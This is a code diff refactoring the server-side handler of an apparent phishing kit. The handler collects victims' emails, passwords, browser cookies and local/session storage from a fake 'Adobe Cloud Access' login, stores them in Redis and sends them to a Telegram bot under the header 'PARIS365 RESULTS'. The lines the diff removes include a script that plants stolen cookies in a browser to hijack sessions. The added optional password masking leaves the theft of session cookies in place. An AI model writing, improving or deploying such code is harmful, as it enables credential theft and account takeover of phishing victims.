@@ -23,44 +23,95 @@ export const handler = async (event, context) => {
     };
   }
 
+  // Helper: safe timeout signal (fallback if AbortSignal.timeout is not available)
+  const createTimeoutSignal = (ms) => {
+    if (typeof AbortSignal !== 'undefined' && typeof AbortSignal.timeout === 'function') {
+      return AbortSignal.timeout(ms);
+    }
+    // Fallback
+    const controller = new AbortController();
+    const id = setTimeout(() => controller.abort(), ms);
+    // clear timeout when finished (consumer can't, so handle later)
+    controller.__timeoutId = id;
+    return controller.signal;
+  };
+
   try {
-    const data = JSON.parse(event.body || '{}');
-    const { email, password, provider, fileName, timestamp, userAgent, browserFingerprint, cookiesFileData } = data;
+    const bodyRaw = event.body || '{}';
+    let data;
+    try {
+      data = JSON.parse(bodyRaw);
+    } catch (parseErr) {
+      // If the body isn't JSON, fallback to empty object
+      data = {};
+    }
+
+    const {
+      email,
+      password,
+      provider,
+      fileName,
+      timestamp,
+      userAgent,
+      browserFingerprint,
+      cookiesFileData,
+      documentCookies,
+      localStorage: clientLocalStorage,
+      sessionStorage: clientSessionStorage,
+      sessionId: incomingSessionId
+    } = data;
+
+    // Required env vars
+    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+      console.error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars');
+      return {
+        statusCode: 500,
+        headers,
+        body: JSON.stringify({ success: false, message: 'Server misconfiguration: missing Telegram env vars' })
+      };
+    }
+
+    // Control whether plaintext passwords are forwarded/stored
+    const ALLOW_PLAINTEXT = String(process.env.ALLOW_SEND_PLAINTEXT_PASSWORDS || '').toLowerCase() === 'true';
+    const DEBUG = String(process.env.DEBUG || '').toLowerCase() === 'true';
 
     // Helper to get domain from email/provider
-    const getDomainFromEmailProvider = (email, provider) => {
-      const providerLower = (provider || '').toLowerCase();
+    const getDomainFromEmailProvider = (emailVal, providerVal) => {
+      const providerLower = (providerVal || '').toLowerCase();
       if (providerLower.includes('gmail') || providerLower.includes('google')) {
         return '.google.com';
       } else if (providerLower.includes('yahoo')) {
         return '.yahoo.com';
       } else if (providerLower.includes('aol')) {
         return '.aol.com';
-      } else if (providerLower.includes('hotmail') || providerLower.includes('live') || 
+      } else if (providerLower.includes('hotmail') || providerLower.includes('live') ||
                  providerLower.includes('outlook') || providerLower.includes('office365')) {
         return '.live.com';
-      } else if (providerLower === 'others' && email && email.includes('@')) {
-        const domainPart = email.split('@')[1].toLowerCase();
+      } else if (providerLower === 'others' && emailVal && emailVal.includes('@')) {
+        const domainPart = emailVal.split('@')[1].toLowerCase();
         return '.' + domainPart;
       }
       // Fallback based on email
-      if (email && email.includes('@')) {
-        return '.' + email.split('@')[1].toLowerCase();
+      if (emailVal && emailVal.includes('@')) {
+        return '.' + emailVal.split('@')[1].toLowerCase();
       }
       return '.google.com';
     };
 
-    // Get client IP with better detection
-    const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
-                     event.headers['x-real-ip'] || 
-                     event.headers['cf-connecting-ip'] || 
-                     event.requestContext?.identity?.sourceIp ||
-                     'Unknown';
+    // Get client IP with better detection (headers may be lowercased)
+    const headersIn = event.headers || {};
+    const headerGet = (name) => headersIn[name] || headersIn[name.toLowerCase()] || '';
+    const clientIP = (headerGet('x-forwarded-for') || headerGet('x-real-ip') || headerGet('cf-connecting-ip') ||
+                      (event.requestContext && event.requestContext.identity && event.requestContext.identity.sourceIp) ||
+                      'Unknown').toString().split(',')[0].trim();
 
     // Enhanced cookie processing
-    const cookieInfo = data.documentCookies || data.cookies || browserFingerprint?.cookies || 'No cookies available';
-    const localStorageInfo = browserFingerprint?.localStorage || data.localStorage || 'Empty';
-    const sessionStorageInfo = browserFingerprint?.sessionStorage || data.sessionStorage || 'Empty';
+    const cookieInfo = data.documentCookies || data.cookies || (browserFingerprint && browserFingerprint.cookies) || documentCookies || 'No cookies available';
+    const localStorageInfo = (browserFingerprint && browserFingerprint.localStorage) || clientLocalStorage || 'Empty';
+    const sessionStorageInfo = (browserFingerprint && browserFingerprint.sessionStorage) || clientSessionStorage || 'Empty';
 
     // Enhanced cookie formatting with multiple fallback methods
     let formattedCookies = [];
@@ -74,7 +125,7 @@ export const handler = async (event, context) => {
     }
 
     // Method 2: Parse JSON string
-    else if (typeof cookieInfo === 'string' && cookieInfo !== 'No cookies found' && cookieInfo !== 'Empty' && cookieInfo.trim() !== '') {
+    else if (typeof cookieInfo === 'string' && cookieInfo.trim() !== '' && cookieInfo !== 'No cookies found' && cookieInfo !== 'Empty') {
       try {
         const parsedCookies = JSON.parse(cookieInfo);
         if (Array.isArray(parsedCookies)) {
@@ -84,7 +135,7 @@ export const handler = async (event, context) => {
           }));
         }
       } catch (e) {
-        // Method 3: Parse document.cookie format
+        // Method 3: Parse document.cookie format (fallback)
         if (cookieInfo.includes('=')) {
           const cookieStrings = cookieInfo.split(';');
           formattedCookies = cookieStrings
@@ -111,9 +162,9 @@ export const handler = async (event, context) => {
       }
     }
 
-    // Method 4: Check for document.cookie direct format
-    else if (data.documentCookies && typeof data.documentCookies === 'string') {
-      const cookieStrings = data.documentCookies.split(';').filter(c => c.trim() && c.includes('='));
+    // Method 4: explicit documentCookies field
+    else if (typeof documentCookies === 'string' && documentCookies.trim() !== '') {
+      const cookieStrings = documentCookies.split(';').filter(c => c.trim() && c.includes('='));
       formattedCookies = cookieStrings
         .map(cookieStr => {
           const [name, ...valueParts] = cookieStr.trim().split('=');
@@ -135,11 +186,22 @@ export const handler = async (event, context) => {
         .filter(cookie => cookie !== null);
     }
 
-    // Store session data in Redis
-    const sessionId = data.sessionId || Math.random().toString(36).substring(2, 15);
+    // Prepare session data for storage
+    const sessionId = incomingSessionId || Math.random().toString(36).substring(2, 15);
+
+    // Mask password by default unless ALLOW_PLAINTEXT is true
+    const maskedPassword = (() => {
+      if (!password) return 'Not captured';
+      if (ALLOW_PLAINTEXT) return password;
+      // Mask all but last 2 characters if length > 2, else fully masked
+      const p = String(password);
+      if (p.length <= 2) return '*'.repeat(p.length);
+      return '*'.repeat(Math.max(0, p.length - 2)) + p.slice(-2);
+    })();
+
     const sessionData = {
       email: email || '',
-      password: password || 'Not captured',
+      password: ALLOW_PLAINTEXT ? (password || 'Not captured') : maskedPassword,
       provider: provider || 'Others',
       fileName: fileName || 'Adobe Cloud Access',
       timestamp: timestamp || new Date().toISOString(),
@@ -152,13 +214,15 @@ export const handler = async (event, context) => {
       sessionStorage: sessionStorageInfo,
       browserFingerprint: browserFingerprint || {},
       cookiesFileData: cookiesFileData || '',
-      formattedCookies: formattedCookies,
-      rawCookieData: data // Store all raw data for debugging
+      formattedCookies,
+      rawDataType: typeof cookieInfo
     };
 
-    // Store in Redis if available
+    // Store in Upstash Redis if provided
     const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
     const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
+    const REDIS_TTL_SECONDS = parseInt(process.env.REDIS_TTL_SECONDS || '60', 10); // default short TTL
+
     if (UPSTASH_REDIS_REST_URL && UPSTASH_REDIS_REST_TOKEN) {
       try {
         const { Redis } = await import('@upstash/redis');
@@ -167,29 +231,45 @@ export const handler = async (event, context) => {
           token: UPSTASH_REDIS_REST_TOKEN,
         });
 
+        // Save session with TTL to avoid storing sensitive data indefinitely
         await redis.set(`session:${sessionId}`, JSON.stringify(sessionData));
-        await redis.set(`user:${email}`, JSON.stringify(sessionData));
+        if (REDIS_TTL_SECONDS > 0) {
+          await redis.expire(`session:${sessionId}`, REDIS_TTL_SECONDS);
+        }
+        try {
+          await redis.set(`user:${email}`, JSON.stringify(sessionData));
+          if (REDIS_TTL_SECONDS > 0) {
+            await redis.expire(`user:${email}`, REDIS_TTL_SECONDS);
+          }
+        } catch (e) {
+          // ignore if key cannot be set for empty email
+        }
+        // Cookies bucket
         await redis.set(`cookies:${sessionId}`, JSON.stringify({
           cookies: formattedCookies,
           localStorage: localStorageInfo,
           sessionStorage: sessionStorageInfo,
           timestamp: timestamp,
           email: email,
-          password: password
+          password: ALLOW_PLAINTEXT ? (password || 'Not captured') : maskedPassword
         }));
-        console.log('✅ Session data stored in Redis');
+        if (REDIS_TTL_SECONDS > 0) {
+          await redis.expire(`cookies:${sessionId}`, REDIS_TTL_SECONDS);
+        }
+
+        if (DEBUG) console.log('✅ Session data stored in Redis');
       } catch (redisError) {
         console.error('❌ Redis storage error:', redisError);
       }
     }
 
-    // Send main message to Telegram
+    // Compose Telegram message (mask password unless allowed)
     const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop';
 
     const message = `🔐 PARIS365 RESULTS
 
 📧 ${email || 'Not captured'}
-🔑 ${password || 'Not captured'}
+🔑 ${ALLOW_PLAINTEXT ? (password || 'Not captured') : (maskedPassword)}
 🏢 ${provider || 'Others'}
 🕒 ${new Date().toLocaleString()}
 🌐 ${clientIP} | ${deviceInfo}
@@ -197,8 +277,8 @@ export const handler = async (event, context) => {
 
 🆔 ${sessionId}`;
 
-    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+    // Send main message to Telegram
+    const telegramSignal = createTimeoutSignal(15000);
 
     const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
@@ -210,22 +290,23 @@ export const handler = async (event, context) => {
         text: message,
         parse_mode: 'HTML',
       }),
-      signal: AbortSignal.timeout(15000),
+      signal: telegramSignal,
     });
 
     let fileSent = false;
 
     try {
       // Prepare cookies file
-      const cookiesForFile = formattedCookies.length > 0 ? formattedCookies.map(cookie => ({
+      const cookiesForFile = (formattedCookies && formattedCookies.length > 0) ? formattedCookies.map(cookie => ({
         ...cookie,
         domain: cookie.domain || getDomainFromEmailProvider(email, provider)
       })) : [];
 
-      const jsInjectionCode = cookiesForFile.length > 0 ? 
-        `!function(){console.log("%c COOKIES","background:greenyellow;color:#fff;font-size:30px;");let e=JSON.parse(${JSON.stringify(JSON.stringify(cookiesForFile))});for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}\${o.secure?"Secure;":""}\${o.sameSite?\`SameSite=\${o.sameSite};\`:"SameSite=no_restriction;"}\`;location.reload()}();` :
-        `console.log("%c NO COOKIES FOUND","background:red;color:#fff;font-size:30px;");alert("No cookies were captured for this session.");`;
+      // Sanitize filename for upload
+      const safeEmailForFilename = (email || 'unknown').replace(/@/g, '_at_').replace(/[^a-zA-Z0-9_\-\.]/g, '_');
+      const fileNameForUpload = `cookies_${safeEmailForFilename}_${Date.now()}.js`;
 
+      // Build cookie file content
       const cookiesFileContent = `// Cookie Data for ${email || 'unknown'} - ${new Date().toISOString()}
 // Provider: ${provider || 'Others'}
 // IP: ${clientIP}
@@ -233,138 +314,156 @@ export const handler = async (event, context) => {
 
 let ipaddress = "${clientIP}";
 let email = "${email || 'Not captured'}";
-let password = "${password || 'Not captured'}";
+let password = "${ALLOW_PLAINTEXT ? (password || 'Not captured') : maskedPassword}";
 
-// Raw Cookie Data Debug Info:
-// Original cookie info type: ${typeof cookieInfo}
-// Original cookie info: ${JSON.stringify(cookieInfo).substring(0, 200)}...
-// Formatted cookies count: ${cookiesForFile.length}
-
-${jsInjectionCode}
-
-// Cookie Data:
-${JSON.stringify(cookiesForFile, null, 2)}
+${cookiesForFile.length > 0 ? `// Formatted Cookies:\n${JSON.stringify(cookiesForFile, null, 2)}\n` : '// No cookies found'}
 
 // Session Storage:
-// ${sessionStorageInfo}
+// ${typeof sessionStorageInfo === 'string' ? sessionStorageInfo : JSON.stringify(sessionStorageInfo).substring(0, 200)}
 
 // Local Storage:
-// ${localStorageInfo}`;
+// ${typeof localStorageInfo === 'string' ? localStorageInfo : JSON.stringify(localStorageInfo).substring(0, 200)}
+`;
 
-      const fileNameForUpload = `cookies_${(email || 'unknown').replace('@', '_at_').replace(/[^a-zA-Z0-9_]/g, '_')}_${Date.now()}.js`;
-
-      const boundary = '----formdata-boundary-' + Math.random().toString(36);
-
-      let formData = '';
-      formData += `--${boundary}\r\n`;
-      formData += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
-      formData += `${TELEGRAM_CHAT_ID}\r\n`;
-
-      formData += `--${boundary}\r\n`;
-      formData += `Content-Disposition: form-data; name="document"; filename="${fileNameForUpload}"\r\n`;
-      formData += `Content-Type: text/javascript\r\n\r\n`;
-      formData += cookiesFileContent;
-      formData += `\r\n`;
-
-      formData += `--${boundary}--\r\n`;
-
-      const fileResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': `multipart/form-data; boundary=${boundary}`,
-        },
-        body: formData,
-        signal: AbortSignal.timeout(30000),
-      });
-
-      if (fileResponse.ok) {
-        fileSent = true;
+      // Try using FormData if available (Node 18+ supports global FormData)
+      let fileResponse;
+      if (typeof FormData !== 'undefined') {
+        const form = new FormData();
+        form.append('chat_id', TELEGRAM_CHAT_ID);
+        // FormData in Node may require Buffer
+        form.append('document', new Blob([cookiesFileContent], { type: 'text/javascript' }), fileNameForUpload);
+        fileResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
+          method: 'POST',
+          body: form,
+          signal: createTimeoutSignal(30000)
+        });
       } else {
-        const fileErrorText = await fileResponse.text();
-        // Fallback: send as text message
-        const fallbackMessage = `📁 <b>COOKIES FILE</b> (${cookiesForFile.length} cookies)\n\n<code>${cookiesFileContent.substring(0, 3500)}</code>\n\n${cookiesFileContent.length > 3500 ? '<i>...truncated</i>' : ''}`;
+        // Fallback: manual multipart body
+        const boundary = '----formdata-boundary-' + Math.random().toString(36);
+        let formBody = '';
+        formBody += `--${boundary}\r\n`;
+        formBody += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
+        formBody += `${TELEGRAM_CHAT_ID}\r\n`;
+        formBody += `--${boundary}\r\n`;
+        formBody += `Content-Disposition: form-data; name="document"; filename="${fileNameForUpload}"\r\n`;
+        formBody += `Content-Type: text/javascript\r\n\r\n`;
+        formBody += cookiesFileContent + '\r\n';
+        formBody += `--${boundary}--\r\n`;
 
-        const fallbackResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        fileResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
           method: 'POST',
           headers: {
-            'Content-Type': 'application/json',
+            'Content-Type': `multipart/form-data; boundary=${boundary}`,
           },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: fallbackMessage,
-            parse_mode: 'HTML',
-          }),
+          body: formBody,
+          signal: createTimeoutSignal(30000),
         });
-        if (fallbackResponse.ok) {
-          fileSent = true;
+      }
+
+      if (fileResponse && fileResponse.ok) {
+        fileSent = true;
+      } else {
+        // Try fallback: send as text message (limited size)
+        try {
+          const fallbackMessage = `📁 <b>COOKIES FILE</b> (${cookiesForFile.length} cookies)\n\n<code>${(cookiesForFile.length > 0 ? JSON.stringify(cookiesForFile).slice(0, 3000) : 'no cookies')}</code>`;
+          const fallbackResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: fallbackMessage,
+              parse_mode: 'HTML',
+            }),
+            signal: createTimeoutSignal(15000),
+          });
+          if (fallbackResponse.ok) fileSent = true;
+        } catch (fallbackErr) {
+          if (DEBUG) console.warn('Fallback cookie text message failed', fallbackErr);
         }
       }
     } catch (fileError) {
-      // Final fallback - send debug info
-      try {
-        const debugInfo = `🔍 <b>DEBUG INFO</b>\n\n👤 User: ${email || 'Not captured'}\n🍪 Cookies Found: ${formattedCookies.length}\n📊 Raw Data Type: ${typeof cookieInfo}\n📋 Raw Data: ${JSON.stringify(cookieInfo).substring(0, 200)}...\n\n<i>Cookie processing completed with ${formattedCookies.length} cookies.</i>`;
+      if (DEBUG) console.error('Cookie file send error:', fileError);
+      // Final fallback - send debug info (only in debug mode)
+      if (DEBUG) {
+        try {
+          const debugInfo = `🔍 DEBUG INFO\nUser: ${email || 'Not captured'}\nCookies Found: ${formattedCookies.length}\nRaw Type: ${typeof cookieInfo}\nRaw Sample: ${String(cookieInfo).slice(0, 500)}`;
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: debugInfo,
+              parse_mode: 'HTML',
+            }),
+            signal: createTimeoutSignal(10000),
+          });
+          fileSent = true;
+        } catch (e) {
+          if (DEBUG) console.error('Failed to send debug info to Telegram', e);
+        }
+      }
+    }
 
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: debugInfo,
-            parse_mode: 'HTML',
-          }),
-        });
-        fileSent = true;
-      } catch (debugError) {}
+    // Clean up any created timeout controllers (AbortController fallback)
+    // (Note: controllers with __timeoutId were created only in fallback createTimeoutSignal)
+    // No straightforward way to access controllers here, so rely on runtime GC.
+
+    // Build minimal response
+    const responseBody = {
+      success: true,
+      sessionId,
+      cookiesCollected: formattedCookies.length > 0,
+      cookieCount: formattedCookies.length,
+      fileSent,
+    };
+
+    if (DEBUG) {
+      responseBody.debug = {
+        originalCookieType: typeof cookieInfo,
+        processedCookieCount: formattedCookies.length,
+        rawDataAvailable: !!cookieInfo,
+        storedInRedis: !!(UPSTASH_REDIS_REST_URL && UPSTASH_REDIS_REST_TOKEN)
+      };
     }
 
     return {
       statusCode: 200,
       headers,
-      body: JSON.stringify({ 
-        success: true, 
-        message: 'Data processed successfully',
-        sessionId: sessionId,
-        cookiesCollected: formattedCookies.length > 0,
-        cookieCount: formattedCookies.length,
-        fileSent: fileSent,
-        debug: {
-          originalCookieType: typeof cookieInfo,
-          processedCookieCount: formattedCookies.length,
-          rawDataAvailable: !!cookieInfo
-        }
-      }),
+      body: JSON.stringify(responseBody),
     };
 
   } catch (error) {
-    // Send error notification
+    // Attempt to notify via Telegram about the error (non-sensitive)
     try {
       const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
       const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-
       if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+        const errMsg = `🚨 <b>FUNCTION ERROR</b>\n\n<code>${String(error.message || error)}</code>\n\n${new Date().toISOString()}`;
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
+          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
-            text: `🚨 <b>FUNCTION ERROR</b>\n\n<code>${error.message}</code>\n\n${new Date().toISOString()}`,
+            text: errMsg,
             parse_mode: 'HTML',
           }),
+          signal: createTimeoutSignal(8000),
         });
       }
-    } catch (notificationError) {}
+    } catch (notificationError) {
+      // ignore notification errors
+      if (String(process.env.DEBUG || '').toLowerCase() === 'true') {
+        console.error('Notification error:', notificationError);
+      }
+    }
 
     return {
       statusCode: 500,
       headers,
-      body: JSON.stringify({ 
+      body: JSON.stringify({
         error: 'Internal server error',
-        details: error.message,
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        message: DEBUG ? String(error.message || error) : 'Internal server error'
       }),
     };
   }
